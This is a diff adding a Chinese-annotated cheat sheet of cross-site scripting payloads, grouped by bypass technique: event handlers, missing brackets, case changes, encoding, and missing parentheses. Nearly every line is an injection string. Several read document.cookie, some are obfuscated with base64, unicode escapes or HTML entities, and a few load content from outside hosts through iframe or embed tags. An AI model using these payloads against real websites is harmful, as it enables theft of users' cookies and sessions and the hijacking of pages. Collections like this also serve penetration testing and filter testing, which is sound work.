@@ -1,0 +1,99 @@
+
+
+============  没有   尖括号   也可无 斜杠
+"onload="eval(/ale/.source /rt/.source /(111111)/.source)"
+2"onmouseover="alert(document.cookie)
+2"onmouseover="alert('1')
+'onmouseover='alert(1)
+
+
+==========   特殊符号
+<!--  %0A 换行符 -->
+"><html%0Aonpointerenter%0A=%0A[domain].find(confirm)>
+"><HtmL/+/OnPoiNTERENter%09=%09confirm(domain)>
+
+
+====================  常用  XSS  Payload
+1"><h2>zx</h2></iframe><"2
+"><script>alert(document.cookie)</script><"
+1"><iframe src="javascript:alert(1)"></iframe><"2
+<svg/onload=alert(1)>
+1"><iframe src="javascript:alert(document.cookie)"></iframe><"2
+1"><img src="" onerror="alert(document.cookie)"><"3
+"><svg /onload=prompt(1)><"
+0"><img src="" onerror="alert('xss')"><"9
+1"><h2>12<svg/onload=alert(1)>
+1"><BODY onload=alert(1)><"2
+1"><a href="https://www.baidu.com">123</a><"2
+<embed/src=//goo.gl/nlX0P><input onfocus=confirm`` autofocus></embed>
+<svg onload=confirm(1)>
+<h2><svg onload=confirm(1)></h2>
+"><svg /onload=prompt(1)><"
+1"><svg onload=confirm(1)><"2
+2<svg><svg onload=confirm(document.cookie)>3 
+<img src=x onerror=prompt(domain)>
+"><img src="" onerror="alert('xss')"><"
+"><script>alert('xss')</script><"
+<SCRIPT>ALERT('XSS')</SCRIPT>
+</textarea><img src="" onerror="alert(document.cookie)"><"3
+"><img src="" onerror="alert('xss')"><"
+<h2>3<svg onload=confirm(1)></h2>
+<script>showError('2')</script>
+<input typr="file" /><img src="xx"><input type="file" id="input">
+</span></a>"><td>confirm(xss)><td><h2>2</h2>
+59507";alert(1)//276
+<script>confirm(document.domain)</script>
+<table background=javascript:alert(1)></table>
+<iframe src=http://ftpaoe.ftp69.host-ftp.win/1.html>
+1"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object><"2
+'';!--"<XSS>=&{()}
+'';!--"<script>alert(0);</script>=&{()}
+'';!--"<script>alert(0);</script>=&{(alert(1))}
+><script>alert(0)</script>
+/><SCRIPT>/*s*/alert(String.from+CharCode(88, 83, 83))</script>
+//"><scriPT>console.log(0);</sCRIpt>
+<script/onreadystatechange=alert(1)>
+<img src="--><img src=x onerror=alert(1)//">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+Set.constructor`alert\x28document.domain\x29```
+</TITLE><SCRIPT>alert("Vulnerable!");</SCRIPT>
+<a href="javascript:alert(1)">me</a>
+<a href="&#x6A;avascript:alert(1)">me</a>
+&#x6A;avascript:alert(1)
+&#x22;alert('1')20%onmouseover&#x3D;&#x22;alert('1')
+2&#x22;onmouseover&#x3D;&#x22;alert('1')
+1&quot;&gt;&lt;BODY onload=&quot;alert(1)&quot;&gt;&lt;&quot;2
+
+
+==========大小写绕过
+<Svg ONLOAD=confirm(1)>
+
+
+
+==========在script 标签里面
+test";alert(document.cookie)//
+
+
+==========  a标签
+<a href="https://www.baidu.com" onclick="javascript:alert(1)" >baidu</a>
+"><a href="javascript:alert(1)">me</a><"
+
+
+
+==========  无括号
+1<script>onerror=alert;throw document.cookie</script>2
+1"><script>onerror=alert;throw document.cookie</script><"2
+
+
+==========   编码
+\u003Cscript\u003Ealert\u00281\u0029\u003C/script\u003E
+//unicode编码    <script>alert(1)</script>
+\u003C/script\u003E\u003Cscript\u003Ealert\u00281\u0029\u003C/script\u003E
+
+
+==========   标准的javascript代码
+<script type="text/javascript">
+top.location.href = 'https://www.baidu.com';
+</script>
+
+
